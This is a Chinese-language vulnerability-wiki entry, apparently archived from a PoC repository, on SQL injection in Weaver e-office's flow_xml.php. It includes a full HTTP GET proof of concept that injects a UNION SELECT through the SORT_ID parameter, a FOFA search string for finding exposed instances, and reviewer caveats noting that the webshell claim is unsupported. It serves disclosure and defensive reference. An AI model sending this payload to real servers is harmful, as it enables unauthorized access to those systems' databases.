---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "泛微e-office flow_xml.php SQL注入"
product: "泛微e-office"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本；UNION查询及MD5支持"
prerequisites: "仅语言cookie，实际鉴权未知"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEOA%20E-Office%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9Fflow_xml.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md"
fofa: "app=\"泛微-EOffice\""
id: "vw-6c3cc661787bdce36e009c8c"
entity_id: "ve-6c3cc661787bdce36e009c8c"
schema_version: "1"
---

# 泛微e-office flow_xml.php SQL注入

## 条目说明

- 对象与具体问题：泛微e-office；flow_xml.php SQL注入
- 版本、配置及部署条件：无版本；UNION查询及MD5支持
- 认证与权限前提：仅语言cookie，实际鉴权未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 样本仅常量MD5查询，无写Webshell证据，描述应限定数据库权限相关后果
- 无响应/图片，21列UNION前提未说明；HTTP无围栏
- 模板表中方括号和在野利用已知无证据，应去模板噪声

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

泛微OA E-Office flow_xml.php文件存在SQL注入漏洞，攻击者通过漏洞可以写入Webshell文件获取服务器权限。

## 影响范围

泛微OA E-Office 

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | [已公开] | [已公开] | [已知] |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 【高危】 |
| 影响面 | 【广】 |
| 攻击者价值 | 【中】 |
| 利用难度 | 【低】 |

## 漏洞复现

FOFA：app="泛微-EOffice"

POC/EXP：

```http
GET /general/system/workflow/flow_type/flow_xml.php?SORT_ID=1%20union%20select%201,(md5(1)),3,4,5,6,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 HTTP/1.1
Host: 127.0.0.1:81
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: LOGIN_LANG=cn
Connection: close
```


## 修复方案

**官方修复：**

1、请及时关注更新⼚商发布的漏洞修复程序。

2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
